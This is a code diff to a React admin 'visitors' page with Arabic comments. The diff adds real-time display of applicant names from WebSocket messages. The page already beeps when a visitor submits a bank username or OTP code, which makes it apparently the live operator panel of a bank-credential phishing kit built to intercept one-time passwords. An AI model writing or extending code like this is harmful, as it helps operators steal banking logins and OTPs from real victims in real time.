@@ -25,6 +25,11 @@ interface SessionRow {
   applicantName: string | null;
 }
 
+// ─── حالة محلية لتتبع أسماء العملاء المحدثة فوراً ───────────────────────
+interface RealtimeNames {
+  [sessionId: string]: string;
+}
+
 const PAGE_OPTIONS = [
   { value: "home", label: "الرئيسية" },
   { value: "apply", label: "معلومات الطلب" },
@@ -93,6 +98,9 @@ export default function AdminVisitorsPage() {
   const wsRef = useRef<WebSocket | null>(null);
   const { data: rawSessions, refetch } = useListSessions({ query: { refetchInterval: 8000 } });
   const sessions = rawSessions as unknown as SessionRow[];
+  
+  // ─── الأسماء المحدثة فوراً من WebSocket ─────────────────────────────────
+  const [realtimeNames, setRealtimeNames] = useState<RealtimeNames>({});
 
   // ─── تتبع الجلسات والطلبات المعروفة لتشغيل الأصوات صحيحاً ───────────────
   const seenSessionIds = useRef<Set<string>>(new Set());
@@ -155,7 +163,7 @@ export default function AdminVisitorsPage() {
 
           // ── بيانات دخول مُدخَلة: نغمتان متوسطتان (660 Hz) ──
           if (msg.type === "application_update" && msg.data) {
-            const app = msg.data as { id?: number; bankUsername?: string; otpCode?: string };
+            const app = msg.data as { id?: number; bankUsername?: string; otpCode?: string; sessionId?: string; applicantName?: string };
             if (app.bankUsername && app.id && !seenCredentialAppIds.current.has(app.id)) {
               seenCredentialAppIds.current.add(app.id);
               if (soundsEnabledRef.current) playBeeps(660, 2);
@@ -164,6 +172,13 @@ export default function AdminVisitorsPage() {
             if (app.otpCode && app.id && !seenOtpAppIds.current.has(app.id)) {
               seenOtpAppIds.current.add(app.id);
               if (soundsEnabledRef.current) playBeeps(440, 3);
+            }
+            // ── تحديث اسم العميل فوراً في صفحة الزوار ──
+            if (app.sessionId && app.applicantName) {
+              setRealtimeNames(prev => ({
+                ...prev,
+                [app.sessionId!]: app.applicantName!,
+              }));
             }
           }
 
@@ -295,7 +310,8 @@ export default function AdminVisitorsPage() {
           {sessions && sessions.length > 0 ? (
             <div className="divide-y">
               {sessions.map((session) => {
-                const clientName = (session as any).applicantName as string | null;
+                // استخدام الأسماء الفورية من WebSocket أولاً، ثم من البيانات
+                const clientName = realtimeNames[session.id] || (session as any).applicantName as string | null;
                 const active = isReallyActive(session as any);
                 const isNew = !clientName;
 
